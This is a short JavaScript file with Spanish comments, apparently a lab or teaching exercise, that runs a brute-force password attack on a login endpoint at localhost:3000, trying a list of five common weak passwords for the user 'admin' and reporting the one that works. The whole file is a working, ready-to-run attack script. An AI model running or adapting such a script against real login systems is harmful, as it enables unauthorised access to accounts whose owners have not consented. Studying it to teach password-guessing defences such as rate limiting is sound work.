// Importar la librería axios para realizar solicitudes HTTP
const axios = require('axios');

// URL del sistema de autenticación al que se enviarán las solicitudes
const url = "http://localhost:3000/login";

// Nombre de usuario objetivo para el ataque
const usuario = "admin";

// Lista de contraseñas débiles que se probarán en el ataque
const contraseñas = ["123456", "admin", "password", "qwerty", "12345"];

// Función asíncrona para realizar un ataque de fuerza bruta
async function ataqueFuerzaBruta() {
    // Recorrer cada contraseña en la lista de contraseñas
    for (let contraseña of contraseñas) {
        try {
            // Enviar una solicitud POST al servidor con el usuario y la contraseña actual
            const respuesta = await axios.post(url, { usuario, contraseña });

            // Verificar si la respuesta indica que el acceso fue exitoso
            if (respuesta.data.acceso) {
                // Si el acceso fue exitoso, imprimir la contraseña encontrada
                console.log(`¡Contraseña encontrada! ${contraseña}`);
                // Salir del bucle ya que se encontró la contraseña correcta
                break;
            } else {
                // Si el acceso fue denegado, imprimir un mensaje de intento fallido
                console.log(`Intento fallido con: ${contraseña}`);
            }
        } catch (error) {
            // Capturar y manejar errores (por ejemplo, problemas de red o respuestas inválidas)
            console.error("Error en el intento:", error.message);
        }
    }
}

// Llamar a la función para iniciar el ataque de fuerza bruta
ataqueFuerzaBruta();

